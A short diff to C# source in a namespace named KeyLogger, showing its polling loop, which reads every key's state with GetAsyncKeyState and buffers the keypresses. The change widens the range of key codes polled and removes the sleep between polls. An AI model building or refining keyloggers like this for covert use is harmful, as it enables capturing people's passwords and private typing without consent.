@@ -1,6 +1,5 @@
 ﻿using System.IO;
 using System.Runtime.InteropServices;
-using System.Threading;
 
 namespace KeyLogger
 {
@@ -15,7 +14,7 @@ namespace KeyLogger
             string buffer = "";
             while (true)
             {
-                for (int i = 8; i < 190; i++)
+                for (int i = 0; i < 200; i++)
                 {
                     int keyPressed = GetAsyncKeyState(i);
                     if (keyPressed == 32769)
@@ -58,7 +57,6 @@ namespace KeyLogger
                                 break;
                         }
                 }
-                Thread.Sleep(10);
 
                 if (buffer.Length >= 8)
                 {
